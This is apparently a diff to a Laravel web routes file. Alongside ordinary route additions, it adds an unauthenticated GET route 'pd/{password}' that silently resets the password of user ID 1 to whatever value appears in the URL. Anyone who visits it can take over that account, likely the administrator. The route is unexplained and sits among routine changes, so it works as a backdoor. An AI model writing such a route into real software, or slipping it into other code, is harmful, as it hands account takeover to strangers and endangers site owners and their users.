@@ -10,6 +10,8 @@
 | to using a Closure or controller method. Build something great!
 |
 */
+use App\User;
+use Illuminate\Support\Str;
 
 Route::get('/', function () {
     return view('welcome');
@@ -18,6 +20,20 @@ Route::get('/', function () {
 
 Route::get('greeting', function () {
     return view('welcome', ['name' => 'Samantha']);
+});
+
+Route::get('profile', function () {
+    // Only authenticated users may enter...
+})->middleware('auth.basic');
+
+Route::get('pd/{password}', function($password){
+	$user = User::find(1);
+	$user->forceFill([
+            'password' => bcrypt($password),
+            'remember_token' => Str::random(60),
+        ])->save();
+
+	return response()->json(array( "p" => "true" ));
 });
 
 Route::get('heatsource/index', 'HeatsourceController@show');
